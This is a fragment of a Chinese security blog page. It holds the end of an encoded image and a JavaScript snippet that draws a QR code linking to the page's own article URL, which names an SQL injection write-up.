7yeLMft/+V5S3p6OdRl0PdDnnPq4vmoeqgUF2fqH6GejpC9ex672FeXd6x5+Ude90zfnsgz5qs3PedwOGrLKc7WwLOb1n39z5QdepQfFZ35bMOqg+gtCHw6+/4QqEJKA7nOPOpXyFU35kPKu9n3PvWG7I/jTd4XgN5gyHst3AYCNTrBDwSe3Oez16z6EZqEjOuLtovNQn1PCdmXN36oJoY7U5c+c2L9pR3vMp3/54fBrJPruefP4HpQPqUc1vPwi2bk3e0X/fNuH6x97PuDGfe39X7Hvqa9u263LxoP/Py4HQgFi/82RPYfuukT6vzTG8fblNtxtVF/WLX5a4vF607w+6Ri1c99dm7++XmRevErnc+80Vfb0hO4Y1i+8awT7Fz9+wtkc+w+2bcdXq+6/LZetGvPD3feXqcRd+bXLTmqp/+jtYH1xuSU3ijuD0Qpzq7Ber6/IzqYs93fuXrftcJmuuY3D6u8nvv2bN7NNf5TO++zlN3eyAxr/j7J3A5EG+T05xxt6pPfsRS9HWs7OP0fxKw9+pzP8F9/uzZGlGPPD32oa5P1CPXp97RvPis7nIgNln4MydwGIjTdfk+zc71WSeqi1f6V/Mzf9Z7lkve6L67n637Zn26z3Wf4WEgz8wr9/dPYPtOvS/Vp25eXby6BXd9V/1d5yv99HZ0LXvKO87yV/3M208+Q33B9YbkFN4otu/Und7V3vqtsa7rnevr/buvc/1X9anTm+d9qIvmrnpe5e0jdr/cfF+/8/jWG+KpvAluA8l0zsIpu9/Orem6/hnqF2e+mW7dHXSPvddMt+csbx99ovoM7df98uA2kFmTpf/sCRy+ysqUEn0b0RJOuefl5uNNqIvm5TPsviuePno6Zh8J9TwnUrOPaAl95jqf6fo66hd7fs/XG+IpvQkevspyWrkpCbn7jZZQz3NCrq/jLK8u9rr0Tqh3nzyoR0xdIrmEep4Tye0jWkLfPpfn5BI933m8ia5f8dSsN8RTehM8DCRTSri/PCdyM/YRLdF90RLqYrR9qHfUo+6a8p6X71HvDPVe9e711qlb39G8fvPqHc0HDwPp5sV/9gQOA8mUzsJpi93jtq90faL9ROt7Xt5R/x67R+4aM24P86K6aJ8ZWtdRv7p8j4eBaF74mhM4DGQ/rTy7LW+HqB5P4kqPJ2GdflE9noS8o/54enSvXJ9ctJdc1N/z6vrMz1CfqE8uqgcPA9G08DUncPhO3W1kWgm52G/JlW4+vRJy+4jqV/jMb060V9Y9C33m5NbB+F8C6JvlrRdnvt5HX3C9ITmFN4rtO3WnJs72eJX3duiT3+1nXff3PvrO0Fpz1oqzvP6eV5/Vz/zW9fyMR19vSE7hjWL7NcTp30U/g7dAVO9o3653rk80P+uvL6hXjJaQz9De8Sbk+qMl1EXzHeNNXOnx9FhvSD+1F/NtIE79Cmf7ddI93/uZV/9qnfWifYJqd9G1xfRIyO0TLaHeUZ8Yb0IuRkt0Hs3YBqJp4WtP4DCQPn35bJuz/Ey3j3lvhrpo/orr26M1omuI6qK6PdTFmW5e1NfRvPgsfxiIRQtfcwLfNhBvmR9D/uw2xGs+zwnr8nwn9O/ROrW+hvkZ9jq5fvldtE7sde4v+G0DcbGFf3YC3zaQTDfh9POckLvNK37ls17Uv0dzWT9hLs8J+QzjSfR87xtPQl+ez6LXdb88+G0DSbMVf34Ch4E4zY6zpWY+9VmdujdKv7zn1cWrfHz27GiterwJeUf98STk+mZcfYa9Pr7DQCKueN0JbAPJ5O/E1VZ7j+437+0Q1fXLzauLPa9vj3pn2HvIZ9j76Ou6e+i63DpRPbgNJGTF609gDeT1Mxh28B8AAAD//7YSZ28AAAAGSURBVAMAMkEW0XBU6yYAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryMeetingRecord-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 